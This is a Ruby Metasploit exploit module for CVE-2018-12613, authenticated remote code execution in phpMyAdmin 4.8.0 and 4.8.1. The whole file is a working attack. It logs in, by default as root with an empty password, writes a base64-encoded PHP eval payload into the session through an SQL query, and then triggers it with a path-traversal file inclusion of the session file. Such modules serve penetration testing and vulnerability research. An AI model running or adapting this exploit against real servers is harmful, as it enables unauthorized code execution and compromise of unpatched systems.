##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'phpMyAdmin Authenticated Remote Code Execution',
      'Description'     => %q{
        phpMyAdmin v4.8.0 and v4.8.1 are vulnerable to local file inclusion,
        which can be exploited post-authentication to execute PHP code by
        application. The module has been tested with phpMyAdmin v4.8.1.
      },
      'Author' =>
        [
          'ChaMd5', # Vulnerability discovery and PoC
          'Henry Huang', # Vulnerability discovery and PoC
          'Jacob Robles', # Metasploit Module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'BID', '104532' ],
          [ 'CVE', '2018-12613' ],
          [ 'CWE', '661' ],
          [ 'URL', 'https://www.phpmyadmin.net/security/PMASA-2018-4/' ],
          [ 'URL', 'https://www.secpulse.com/archives/72817.html' ],
          [ 'URL', 'https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/' ]
        ],
      'Privileged'  => false,
      'Platform'  => [ 'php' ],
      'Arch'  => ARCH_PHP,
      'Targets' =>
        [
          [ 'Automatic', {} ],
          [ 'Windows', {} ],
          [ 'Linux', {} ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 19 2018'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base phpMyAdmin directory path", '/phpmyadmin/']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'root']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", ''])
      ])
  end

  def check
    begin
      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path) })
    rescue
      vprint_error("#{peer} - Unable to connect to server")
      return Exploit::CheckCode::Unknown
    end

    if res.nil? || res.code != 200
      vprint_error("#{peer} - Unable to query /js/messages.php")
      return Exploit::CheckCode::Unknown
    end

    # v4.8.0 || 4.8.1 phpMyAdmin
    if res.body =~ /PMA_VERSION:"(\d+\.\d+\.\d+)"/
      version = Gem::Version.new($1)
      vprint_status("#{peer} - phpMyAdmin version: #{version}")

      if version == Gem::Version.new('4.8.0') || version == Gem::Version.new('4.8.1')
        return Exploit::CheckCode::Appears
      end
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Unknown
  end

  def query(uri, qstring, cookies, token)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, 'import.php'),
      'cookie' => cookies,
      'vars_post' => Hash[{
        'sql_query' => qstring,
        'db' => '',
        'table' => '',
        'token' => token
      }.to_a.shuffle]
    })
  end

  def lfi(uri, data_path, cookies, token)
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'index.php'),
      'cookie' => cookies,
      'encode_params' => false,
      'vars_get' => {
        'target' => "db_sql.php%253f#{'/..'*16}#{data_path}"
      }
    })
  end

  def exploit
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
    end

    uri = target_uri.path
    vprint_status("#{peer} - Grabbing CSRF token...")

    response = send_request_cgi({'uri' => uri})

    if response.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage grabbing CSRF token")
    elsif response.body !~ /token"\s*value="(.*?)"/
      fail_with(Failure::NotFound, "#{peer} - Couldn't find token. Is URI set correctly?")
    end
    token = Rex::Text.html_decode($1)

    if target.name =~ /Automatic/
      /\((?<srv>Win.*)?\)/ =~ response.headers['Server']
      mytarget = srv.nil? ? 'Linux' : 'Windows'
    else
      mytarget = target.name
    end

    vprint_status("#{peer} - Identified #{mytarget} target")

    cookies = response.get_cookies


    vprint_status("#{peer} - Retrieved token #{token}")
    vprint_status("#{peer} - Retrieved cookies #{cookies}")
    vprint_status("#{peer} - Authenticating...")

    login = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, 'index.php'),
      'cookie' => cookies,
      'vars_post' => {
        'token' => token,
        'pma_username' => datastore['USERNAME'],
        'pma_password' => datastore['PASSWORD']
      }
    })

    if login.nil? || login.code != 302
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage")
    end

    #Ignore the first cookie
    cookies = login.get_cookies
    vprint_status("#{peer} - Retrieved cookies #{cookies}")

    login_check = send_request_cgi({
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_get' => { 'token' => token },
      'cookie' => cookies
    })

    if login_check.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage")
    elsif login_check.body.include? 'Welcome to'
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif login_check.body !~ /token"\s*value="(.*?)"/
      fail_with(Failure::NotFound, "#{peer} - Couldn't find token. Is URI set correctly?")
    end
    token = Rex::Text.html_decode($1)

    vprint_status("#{peer} - Authentication successful")

    #Generating strings/payload
    queryPayload = "select '<?php eval(base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\")); ?>'"
    

    #Run the query
    res = query(uri, queryPayload, cookies, token)
    if res.nil? || res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Failed to run the script")
    end

    #Session path location
    /phpMyAdmin=(?<session_name>.*?);/ =~ cookies
    data_path = "/var/lib/php/sessions/sess_#{session_name}"

    res = lfi(uri, data_path, cookies, token)

  end
end
